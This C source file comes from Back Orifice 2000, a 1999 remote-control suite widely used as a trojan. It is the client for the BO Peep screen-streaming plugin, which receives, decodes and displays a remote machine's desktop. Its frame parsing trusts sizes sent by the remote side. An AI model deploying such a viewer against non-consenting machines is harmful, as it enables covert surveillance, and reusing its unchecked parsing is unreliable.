/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<plugins.h>
#include<bocomreg.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<config.h>
#include"bo_peep.h"
#include"client.h"
#include<resource.h>

typedef struct {
	// Windows
	HWND hParent;
	HWND hDialog;
	
	// View
	HDC  hViewDC;
	HBITMAP hbmView;
	HGDIOBJ hgdiold;
	BYTE *pcViewBits;
	BITMAPINFO biView;
	RGBQUAD rgbPal[255];
	int	sizex;
	int sizey;
	RECT rVid;
	HBRUSH hbrBkgd;
	
	// Full
	int xscdim;
	int yscdim;
	BYTE *pcFullBits;

	// Misc
	DWORD dwLastTime;
	DWORD dwBytes;
	DWORD dwKsec;
	DWORD dwKRsec;

	CAuthSocket *pSock;
	WORD wFlags;
	DWORD dwFrameCount;
	HFONT hFont;
	HCURSOR hCursor;
	char svCaption[32];
} VIDSTREAM_CONTEXT;

typedef struct {
	HWND hParent;
} THREAD_ARGS;


#define WM_RESIZEVIEW (WM_USER+112)
#define WM_RESIZEFULL (WM_USER+113)

// VidStreamConnect: Prompts the user for connection information,
// connects an authenticated socket, and updates the dialog box

int VidStreamConnect(VIDSTREAM_CONTEXT *vscontext) 
{
	// Update dialog box
	SendDlgItemMessage(vscontext->hDialog,IDC_CONNECT,BM_SETCHECK,BST_CHECKED,0);
	SendDlgItemMessage(vscontext->hDialog,IDC_CONNECT,WM_SETTEXT,0,(LPARAM)"Disconnect");

	// Create connection socket
	CAuthSocket *pSock=ConnectAuthSocket(InteractiveConnect,0,vscontext->hDialog,
		GetCfgStr(g_szAdvancedOptions,"VidStream Bind Str"),
		GetCfgStr(g_szAdvancedOptions,"VidStream Net Module"),
		GetCfgStr(g_szAdvancedOptions,"VidStream Encryption"),
		GetCfgStr(g_szAdvancedOptions,"VidStream Auth"));
	
	if(pSock==NULL) {
		SendDlgItemMessage(vscontext->hDialog,IDC_CONNECT,BM_SETCHECK,BST_UNCHECKED,0);
		SendDlgItemMessage(vscontext->hDialog,IDC_CONNECT,WM_SETTEXT,0,(LPARAM)"Connect...");
		return 0;
	} else if(pSock==(CAuthSocket *)0xFFFFFFFF) {
		SendDlgItemMessage(vscontext->hDialog,IDC_CONNECT,BM_SETCHECK,BST_UNCHECKED,0);
		SendDlgItemMessage(vscontext->hDialog,IDC_CONNECT,WM_SETTEXT,0,(LPARAM)"Connect...");
		return -1;
	}
	
	vscontext->pSock=pSock;
	vscontext->dwFrameCount=0;
	
	char svAddr[256];
	pSock->GetRemoteAddr(svAddr,256);
	lstrcpyn(vscontext->svCaption, svAddr, 32);
	
	return 1;
}

// VidStreamDisconnect: Shuts down any socket, and updates the dialog box

BOOL VidStreamDisconnect(VIDSTREAM_CONTEXT *vscontext)
{
	if(vscontext->pSock==NULL) return FALSE;

	vscontext->pSock->Close();
	delete vscontext->pSock;
	vscontext->pSock=NULL;
	
	RECT r;
	r.left=0;
	r.top=0;
	r.right=vscontext->sizex;
	r.bottom=vscontext->sizey;
	FillRect(vscontext->hViewDC,&r,vscontext->hbrBkgd);

	SendDlgItemMessage(vscontext->hDialog,IDC_CONNECT,BM_SETCHECK,BST_UNCHECKED,0);
	SendDlgItemMessage(vscontext->hDialog,IDC_CONNECT,WM_SETTEXT,0,(LPARAM)"Connect...");

	InvalidateRect(vscontext->hDialog,&(vscontext->rVid),FALSE);
	UpdateWindow(vscontext->hDialog);

	return TRUE;
}

// RLEDecompress: Decompress RLE byte stream

BOOL RLEDecompress(BYTE *pInBits, int nInLen, BYTE *pOutBits)
{
	_asm {
		mov esi,dword ptr [pInBits]
		mov edi,dword ptr [pOutBits]
		mov edx,dword ptr [nInLen]
		xor ecx,ecx
		cld
	} 
rleloop:; 
	_asm {
		// Get command byte
		mov cl, byte ptr [esi]
		inc esi
		dec edx

		// Check for repeat
		test cl,080h
		jz rlenorepeat

		// Repeat next byte
		and ecx,07Fh
		mov al,byte ptr [esi]
		inc esi
		dec edx
		rep stosb
		jmp rletail
	}
rlenorepeat:; 
	_asm {
		// Copy literal byte string
		sub edx,ecx
		rep movsb	
	}
rletail:;
	_asm {
		// Loop until finished
		cmp edx,0
		jnz rleloop
	}
	
	return TRUE;
}


// VidStreamFullFrame: Handle full screen VidStream data

void VidStreamFullFrame(VIDSTREAM_CONTEXT *vscontext, BYTE *pData, VIDSTREAM_HEADER *pHeader)
{
	// Decompress full frame into back buffer
	RLEDecompress(pData,pHeader->dwSize,vscontext->pcFullBits);
	
	int nPitchX=vscontext->xscdim-vscontext->sizex;
	int sizex=vscontext->sizex/4;
	int sizey=vscontext->sizey;
	BYTE *fullpos=vscontext->pcFullBits+pHeader->wPosX+pHeader->wPosY*vscontext->xscdim;
	BYTE *viewpos=vscontext->pcViewBits;
	
	// Copy full screen into view buffer
	_asm {
		mov esi,dword ptr [fullpos]
		mov edi,dword ptr [viewpos]
		mov ecx,dword ptr [sizey]
		shl ecx,16
	}
vscyloop:;
	 _asm {
		 mov cx, word ptr [sizex]
	 }
vscxloop:;
	 _asm {		
		 mov eax,dword ptr [esi]
		 mov dword ptr [edi],eax
				 
		 add edi,4
		 add esi,4
				 
		 dec cx
		 jnz vscxloop
		 add esi,dword ptr [nPitchX]
		 sub ecx,65536
		 jnz vscyloop	
	}
}

// VidStreamDiffFrame: Handle diff screen VidStream data

void VidStreamDiffFrame(VIDSTREAM_CONTEXT *vscontext, BYTE *pData, VIDSTREAM_HEADER *pHeader)
{
	// Decompress diffs into view-size buffer
	RLEDecompress(pData,pHeader->dwSize,vscontext->pcViewBits);

	int nPitchX=vscontext->xscdim-vscontext->sizex;
	int sizex=vscontext->sizex/4;
	int sizey=vscontext->sizey;
	BYTE *fullpos=vscontext->pcFullBits+pHeader->wPosX+pHeader->wPosY*vscontext->xscdim;
	BYTE *viewpos=vscontext->pcViewBits;

	// XOR diffs into view buffer and store into full screen view 
	_asm {
		mov esi,dword ptr [fullpos]
		mov edi,dword ptr [viewpos]
		mov ecx,dword ptr [sizey]
		shl ecx,16
	}
vsfyloop:;
	_asm {
		mov cx, word ptr [sizex]
	}
vsfxloop:;
	_asm {		
		mov eax,dword ptr [edi]
		xor eax,dword ptr [esi]
		mov dword ptr [edi],eax
		mov dword ptr [esi],eax

		add edi,4
		add esi,4
		
		dec cx
		jnz vsfxloop
		add esi,dword ptr [nPitchX]
		sub ecx,65536
		jnz vsfyloop	
	}
}

// VidStreamViewRegion: Just pans around the full screen

void VidStreamViewRegion(VIDSTREAM_CONTEXT *vscontext, VIDSTREAM_HEADER *pHeader)
{
	int nPitchX=vscontext->xscdim-vscontext->sizex;
	int sizex=vscontext->sizex/4;
	int sizey=vscontext->sizey;
	BYTE *fullpos=vscontext->pcFullBits+pHeader->wPosX+pHeader->wPosY*vscontext->xscdim;
	BYTE *viewpos=vscontext->pcViewBits;

	// XOR diffs into view buffer and store into full screen view 
	_asm {
		mov esi,dword ptr [fullpos]
		mov edi,dword ptr [viewpos]
		mov ecx,dword ptr [sizey]
		shl ecx,16
	}
vsvfyloop:;
	_asm {
		mov cx, word ptr [sizex]
	}
vsvfxloop:;
	_asm {		
		mov eax,dword ptr [esi]
		add esi,4
		mov dword ptr [edi],eax
		add edi,4
		
		dec cx
		jnz vsvfxloop
		add esi,dword ptr [nPitchX]
		sub ecx,65536
		jnz vsvfyloop	
	}
}



// VidStreamDraw: Paints the VidStream viewport

void VidStreamDraw(VIDSTREAM_CONTEXT *vscontext, VIDSTREAM_HEADER *pHeader)
{
	int cx,cy;
	cx=pHeader->wCurPosX-pHeader->wPosX;
	cy=pHeader->wCurPosY-pHeader->wPosY;

	SetDIBits(vscontext->hViewDC,vscontext->hbmView,0,vscontext->sizey,vscontext->pcViewBits,&(vscontext->biView),DIB_RGB_COLORS);
	DrawIconEx(vscontext->hViewDC,cx,cy,vscontext->hCursor,0,0,0,NULL,DI_DEFAULTSIZE|DI_NORMAL);
	InvalidateRect(vscontext->hDialog,&(vscontext->rVid),FALSE);
	UpdateWindow(vscontext->hDialog);
}


// VidStreamDlgProc: Dialog Procedure for VidStream client

BOOL CALLBACK VidStreamDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	VIDSTREAM_CONTEXT *vscontext=(VIDSTREAM_CONTEXT *)GetWindowLong(hwndDlg,GWL_USERDATA);
		
	WORD wID,wNotifyCode;
	HWND hwndCtl;
	RECT r;
	PAINTSTRUCT ps;
	HDC hdc;
	HGDIOBJ hgdifont;
	int height,width,i;
	char svCaption[32];
	SYSTEMTIME st;
			
	switch(uMsg) {
	case WM_INITDIALOG:
		SetWindowLong(hwndDlg,GWL_USERDATA,(LONG)lParam);
		
		// Initialize VidStream context
		vscontext=(VIDSTREAM_CONTEXT *)lParam;
		vscontext->hDialog=hwndDlg;
	
		// View
		vscontext->sizex=160;
		vscontext->sizey=120;
		vscontext->hViewDC=CreateCompatibleDC(NULL);
		vscontext->hbmView=CreateCompatibleBitmap(GetDC(NULL),vscontext->sizex,vscontext->sizey);
		vscontext->hgdiold=SelectObject(vscontext->hViewDC,vscontext->hbmView);
		vscontext->pcViewBits=(BYTE *)malloc(vscontext->sizex*vscontext->sizey);
		memset(&(vscontext->biView.bmiHeader),0,sizeof(BITMAPINFOHEADER));
		vscontext->biView.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
		vscontext->biView.bmiHeader.biWidth=vscontext->sizex;
		vscontext->biView.bmiHeader.biHeight=-vscontext->sizey;
		vscontext->biView.bmiHeader.biPlanes=1;
		vscontext->biView.bmiHeader.biBitCount=8;
		vscontext->biView.bmiHeader.biCompression=BI_RGB;
		vscontext->biView.bmiHeader.biSizeImage=(vscontext->sizex*vscontext->sizey);
		for(i=0;i<256;i++) {
			vscontext->biView.bmiColors[i].rgbBlue=i;
			vscontext->biView.bmiColors[i].rgbGreen=i;
			vscontext->biView.bmiColors[i].rgbRed=i;
			vscontext->biView.bmiColors[i].rgbReserved=0;
		}
		vscontext->rVid.top=8;
		vscontext->rVid.bottom=vscontext->rVid.top+vscontext->sizey;
		width=max(80*2+8,vscontext->sizex)+(8*2)+4;
		height=8+vscontext->sizey+12+24+8+4;
		vscontext->rVid.left=(width/2)-(vscontext->sizex/2)-4;
		vscontext->rVid.right=vscontext->rVid.left+vscontext->sizex;
		vscontext->hbrBkgd=CreateSolidBrush(RGB(0,0,255));
		// Full				
		vscontext->xscdim=640;
		vscontext->yscdim=480;
		vscontext->pcFullBits=(BYTE *)malloc(vscontext->xscdim*vscontext->yscdim);
		// Misc
		vscontext->pSock=NULL;
		vscontext->wFlags=0;
		vscontext->dwFrameCount=0;
		vscontext->hFont=CreateFont(-MulDiv(8, GetDeviceCaps(GetDC(NULL), LOGPIXELSY), 72),0,0,0,FW_NORMAL,FALSE,FALSE,FALSE,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH|FF_DONTCARE,"Arial");
		lstrcpyn(vscontext->svCaption,"not connected",32);
		vscontext->hCursor=(HCURSOR)LoadImage(g_hInstance,MAKEINTRESOURCE(IDC_REMOTEPOINTER),IMAGE_CURSOR,0,0,LR_DEFAULTSIZE);

		// Blue out display
		r.left=0;
		r.top=0;
		r.right=vscontext->sizex;
		r.bottom=vscontext->sizey;
		FillRect(vscontext->hViewDC,&r,vscontext->hbrBkgd);

		// Stats tracking
		vscontext->dwBytes=0;
		vscontext->dwLastTime=GetTickCount();
		vscontext->dwKsec=0;
		vscontext->dwKRsec=0;

		return TRUE;

	case WM_RESIZEVIEW:
		vscontext->sizex=LOWORD(lParam);
		vscontext->sizey=HIWORD(lParam);
		vscontext->wFlags=(WORD)wParam;

		// Deallocate view stuff
		SelectObject(vscontext->hViewDC,vscontext->hgdiold);
		DeleteObject(vscontext->hbmView);
		free(vscontext->pcViewBits);
	
		// View
		vscontext->hbmView=CreateCompatibleBitmap(GetDC(NULL),vscontext->sizex,vscontext->sizey);
		vscontext->hgdiold=SelectObject(vscontext->hViewDC,vscontext->hbmView);
		vscontext->pcViewBits=(BYTE *)malloc(vscontext->sizex*vscontext->sizey);
		vscontext->biView.bmiHeader.biWidth=vscontext->sizex;
		vscontext->biView.bmiHeader.biHeight=-vscontext->sizey;
		vscontext->rVid.top=8;
		vscontext->rVid.bottom=vscontext->rVid.top+vscontext->sizey;
		width=max(80*2+8,vscontext->sizex)+(8*2)+4;
		height=8+vscontext->sizey+12+24+8+4;
		vscontext->rVid.left=(width/2)-(vscontext->sizex/2)-4;
		vscontext->rVid.right=vscontext->rVid.left+vscontext->sizex;
	
		// Blue out display
		r.left=0;
		r.top=0;
		r.right=vscontext->sizex;
		r.bottom=vscontext->sizey;
		FillRect(vscontext->hViewDC,&r,vscontext->hbrBkgd);
	
		// Move and resize window elements
		vscontext->rVid.top=8;
		vscontext->rVid.bottom=vscontext->rVid.top+vscontext->sizey;
		width=max(80*2+8,vscontext->sizex)+(8*2)+4;
		height=8+vscontext->sizey+12+24+8+4;
		vscontext->rVid.left=(width/2)-(vscontext->sizex/2)-4;
		vscontext->rVid.right=vscontext->rVid.left+vscontext->sizex;
				
		// Main Window
		GetWindowRect(hwndDlg,&r);
		MoveWindow(hwndDlg,r.left,r.top,width,height+(24+12),TRUE);
		// Frame
		MoveWindow(GetDlgItem(hwndDlg,IDC_FRAME),vscontext->rVid.left-2,vscontext->rVid.top-2,
			vscontext->sizex+4,vscontext->sizey+4,TRUE);
		// Overlay checkbox
		MoveWindow(GetDlgItem(hwndDlg,IDC_OVERLAY),(width/2)-75,vscontext->rVid.bottom+4,150,14,TRUE);
		// Connect button
		MoveWindow(GetDlgItem(hwndDlg,IDC_CONNECT),(width/4)-(80/2),vscontext->rVid.bottom+24,80,24,TRUE);
		// Copy button
		MoveWindow(GetDlgItem(hwndDlg,IDC_COPY),(width*3/4)-(80/2)-4,vscontext->rVid.bottom+24,80,24,TRUE);
		
		InvalidateRect(hwndDlg,NULL,TRUE);
				
		return TRUE;

	case WM_RESIZEFULL:
		
		vscontext->xscdim=LOWORD(lParam);
		vscontext->yscdim=HIWORD(lParam);
		free(vscontext->pcFullBits);
		vscontext->pcFullBits=(BYTE *)malloc(vscontext->xscdim*vscontext->yscdim);
		memset(vscontext->pcFullBits,0,vscontext->xscdim*vscontext->yscdim);

		return TRUE;

	case WM_PAINT:
		hdc=BeginPaint(hwndDlg, &ps);
		
		if(SendDlgItemMessage(hwndDlg,IDC_OVERLAY,BM_GETCHECK,0,0)==BST_CHECKED) {
			hgdifont=SelectObject(vscontext->hViewDC,vscontext->hFont);
			r.left=1;
			r.top=vscontext->sizey-12;
			r.right=vscontext->sizex;
			r.bottom=vscontext->sizey;
			GetLocalTime(&st);

			DWORD dwTime=GetTickCount();
			if((dwTime-vscontext->dwLastTime)>=1000) {
				DWORD dwBsec;
				dwBsec=(vscontext->dwBytes*1000)/(dwTime-vscontext->dwLastTime);
				vscontext->dwKsec=dwBsec/1024;
				vscontext->dwKRsec=((dwBsec%1024)*1000)/102400;
				vscontext->dwBytes=0;
				vscontext->dwLastTime=dwTime;
			}
			

			wsprintf(svCaption,"%.22s %2.2u:%2.2u:%2.2u %d.%dk/sec",vscontext->svCaption, st.wHour,st.wMinute,st.wSecond,vscontext->dwKsec,vscontext->dwKRsec);
			SetBkColor(vscontext->hViewDC,RGB(0,0,0));
			SetTextColor(vscontext->hViewDC,RGB(255,255,255));
			DrawText(vscontext->hViewDC,svCaption,-1,&r,DT_SINGLELINE|DT_CENTER);
			SelectObject(vscontext->hViewDC,hgdifont);
		}
		BitBlt(hdc,vscontext->rVid.left,vscontext->rVid.top,vscontext->sizex,vscontext->sizey,vscontext->hViewDC,0,0,SRCCOPY);
		
		EndPaint(hwndDlg,&ps);
		
		break;
	case WM_CLOSE:
		PostQuitMessage(0);
		return TRUE;

	case WM_COMMAND:
		wNotifyCode = HIWORD(wParam); // notification code 
		wID = LOWORD(wParam);         // item, control, or accelerator identifier 
		hwndCtl = (HWND) lParam;      // handle of control 
		switch(wID) {
		case IDC_CONNECT:
			if(vscontext->pSock==NULL) {
				if(VidStreamConnect(vscontext)==-1) {
					MessageBox(vscontext->hDialog,"Could not connect to VidStream address.\n","Connection error",MB_OK|MB_SETFOREGROUND|MB_TOPMOST|MB_ICONWARNING);	
				}
			} else {
				VidStreamDisconnect(vscontext);
			}
			return TRUE;
		case IDC_COPY:
			{
				HANDLE hmem=GlobalAlloc(GMEM_MOVEABLE | GMEM_DDESHARE,sizeof(BITMAPINFOHEADER)+(256*4)+(vscontext->sizex*vscontext->sizey));
				BYTE *pmem=(BYTE *)GlobalLock(hmem);
				memcpy(pmem,&(vscontext->biView),sizeof(BITMAPINFOHEADER)+(256*4));
				((BITMAPINFOHEADER *)pmem)->biHeight=-((BITMAPINFOHEADER *)pmem)->biHeight;
				// Invert into memory
				for(i=0;i<vscontext->sizey;i++) {		
					memcpy(pmem+sizeof(BITMAPINFOHEADER)+(256*4)+(i*vscontext->sizex),vscontext->pcViewBits+((vscontext->sizey-1)-i)*vscontext->sizex,vscontext->sizex);
				}
				GlobalUnlock(hmem);
	
				if(OpenClipboard(NULL)) {
					EmptyClipboard();
					SetClipboardData(CF_DIB,hmem);
					CloseClipboard();
				}
				else {
					GlobalFree(hmem);
				}
			}
			return TRUE;
		
		}
		return FALSE;
	case WM_DESTROY:
		DestroyCursor(vscontext->hCursor);
		free(vscontext->pcViewBits);
		free(vscontext->pcFullBits);
		SelectObject(vscontext->hViewDC,vscontext->hgdiold);
		DeleteObject(vscontext->hbmView);
		DeleteObject(vscontext->hbrBkgd);
		DeleteDC(vscontext->hViewDC);
		if(vscontext->pSock!=NULL) VidStreamDisconnect(vscontext);
		DeleteObject(vscontext->hFont);
		return TRUE;
	}
	
	return FALSE;
}

// VidStreamThread: Desktop streaming client thread

DWORD WINAPI VidStreamThread(THREAD_ARGS *pArgs)
{
	HWND hParent,hVidStreamDlg;

	// Thread housekeeping
	InterlockedIncrement(&g_nNumThreads);
	hParent=pArgs->hParent;
	free(pArgs);

	// Create context to keep vidstream info
	VIDSTREAM_CONTEXT *vscontext=(VIDSTREAM_CONTEXT *) malloc(sizeof(VIDSTREAM_CONTEXT));	
	if(vscontext==NULL) {
		InterlockedDecrement(&g_nNumThreads);
		return -1;
	}	
	vscontext->hParent=hParent;
	vscontext->pSock=NULL;
	
	// Create vidstream window
	hVidStreamDlg=CreateDialogParam(g_hInstance,MAKEINTRESOURCE(IDD_VIDSTREAMDLG),hParent,VidStreamDlgProc,(LPARAM)vscontext);
	// Adjust window size	
	SendMessage(hVidStreamDlg,WM_RESIZEVIEW,0,MAKELONG(160,120));
	UpdateWindow(hVidStreamDlg);
	
	MSG msg;
	while(g_bActive) {
		Sleep(20);
		
		// ---------------- Handle message processing ----------------
		if(PeekMessage(&msg,NULL,0,0,PM_REMOVE)) {
			if(msg.message==WM_QUIT) goto donehiclient;
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		// --------------- Handle vidstream socket ------------------
		if(vscontext->pSock==NULL) continue;
			
		// Get VidStream frame header
		CAuthSocket *pSock=vscontext->pSock;
		VIDSTREAM_HEADER *pHeader;
		int nSize,nRet;
		if((nRet=pSock->Recv((BYTE **)&pHeader,&nSize))>0) {
			vscontext->dwBytes+=(DWORD)nSize;
			if(nSize<sizeof(VIDSTREAM_HEADER)) {
				pSock->Free((BYTE*)pHeader);
				continue;
			}
			if(pHeader->dwSize>0) {
				// Get rest of VidStream frame
				BYTE *pData=(BYTE *)malloc(pHeader->dwSize);
				if(pData==NULL) {
					pSock->Free((BYTE*)pHeader);
					break;
				}
				
				int i=0;
				while(i<(int)pHeader->dwSize) {
					BYTE *pFrame;
					while((nRet=pSock->Recv(&pFrame,&nSize))==0) 
						Sleep(20);
					if(nRet<0) {
						MessageBox(vscontext->hDialog,"VidStream connection lost.\n","Connection error",MB_OK|MB_SETFOREGROUND|MB_TOPMOST|MB_ICONWARNING);	
						break;
					}
					vscontext->dwBytes+=(DWORD)nSize;
					memcpy(pData+i,pFrame,nSize);
					pSock->Free(pFrame);
					i+=nSize;
				}
				if(nRet<0) break;
				
				// ------------- Check type of packet ------------------
				if(pHeader->wFlags & VHF_FULLFRAME) {
					// Resize fullscreen if necessary
					if((pHeader->wSizeX != vscontext->xscdim) ||
						(pHeader->wSizeY != vscontext->yscdim)) {
						SendMessage(hVidStreamDlg,WM_RESIZEFULL,0,MAKELONG(pHeader->wSizeX,pHeader->wSizeY));
					}
					
					VidStreamFullFrame(vscontext, pData, pHeader);
					
				} else if(pHeader->wFlags & VHF_FRAMEDIFF) {
					// Resize viewport if necessary
					if((pHeader->wSizeX != vscontext->sizex) ||
						(pHeader->wSizeY != vscontext->sizey)) {
						SendMessage(hVidStreamDlg,WM_RESIZEVIEW,(WPARAM)pHeader->wFlags,MAKELONG(pHeader->wSizeX,pHeader->wSizeY));			
					}
					
					VidStreamDiffFrame(vscontext, pData, pHeader);
				}
				free(pData);
			} else {
				// Resize viewport if necessary
				if((pHeader->wSizeX != vscontext->sizex) ||
					(pHeader->wSizeY != vscontext->sizey)) {
					SendMessage(hVidStreamDlg,WM_RESIZEVIEW,(WPARAM)pHeader->wFlags,MAKELONG(pHeader->wSizeX,pHeader->wSizeY));			
				}	
				VidStreamViewRegion(vscontext,pHeader);
			}
				
			// ------------- Draw Frame ------------
			VidStreamDraw(vscontext,pHeader);
			
			// ------------- Clean up -------------
			pSock->Free((BYTE *)pHeader);
			
		}
		
		if(nRet<0) {
			// Disconnect on error
			VidStreamDisconnect(vscontext);
		}
	}
donehiclient:;
	DestroyWindow(hVidStreamDlg);

	free(vscontext);	
	InterlockedDecrement(&g_nNumThreads);

	return 0;
}
	

int CreateVidStreamClient(HWND hParent)
{
	DWORD dwtid;
	HANDLE htd;
	
	THREAD_ARGS *pArgs=(THREAD_ARGS *) malloc(sizeof(THREAD_ARGS));
	if(pArgs==NULL) return NULL;
	
	pArgs->hParent=hParent;
	htd=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)VidStreamThread,pArgs,0,&dwtid);
	if(htd==NULL) {
		return -1;
	}
	CloseHandle(htd);
	
	return 0;
}